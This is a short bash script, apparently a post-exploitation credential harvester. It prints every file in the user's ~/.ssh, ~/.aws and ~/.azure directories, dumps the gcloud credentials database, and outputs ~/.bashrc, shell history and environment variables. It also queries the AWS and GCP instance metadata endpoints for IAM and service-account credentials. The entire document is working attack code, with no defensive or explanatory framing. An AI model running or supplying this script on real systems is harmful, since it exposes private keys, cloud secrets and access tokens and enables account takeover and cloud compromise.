#!/bin/bash


if [ -d ~/.ssh ]; then
	for each in ~/.ssh/*
	do
		echo "[+] $each:"
		cat $each
		echo ""
		echo "------------------------------------------"
        	echo ""
		done
fi

if [ -d ~/.aws ]; then
        for each in ~/.aws/*
        do
                echo "[+] $each:"
                cat $each
                echo ""
                echo "------------------------------------------"
                echo ""
                done
fi

if [ -d ~/.azure ]; then
        for each in ~/.azure/*
        do
                echo "[+] $each:"
                cat $each
                echo ""
                echo "------------------------------------------"
                echo ""
                done
fi

if [ -f ~/.config/gcloud/credentials.db ]; then
        echo "[+] ~/.config/gcloud/credentials.db:"
        echo ""
        sqlite3 ~/.config/gcloud/credentials.db "select * from credentials;"
        echo ""
        echo "------------------------------------------"
        echo ""
fi

if [ -f ~/.bashrc ]; then
	echo "[+] ~/.bashrc:"
	cat ~/.bashrc
	echo ""
	echo "------------------------------------------"
	echo ""
fi	

if [ -f ~/.bash_history ]; then
	echo "[+] ~/.bash_history:"
	cat ~/.bash_history
	echo ""
        echo "------------------------------------------"
        echo ""
fi


echo "[+] env:"
echo ""
env
echo ""
echo "------------------------------------------"
echo ""

echo "[+] metadata service query:"
echo ""
curl -v http://169.254.169.254/latest/meta-data/iam/security-credentials -m 2
echo ""
curl -v http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/ -m 2
echo ""
echo "------------------------------------------"
echo ""
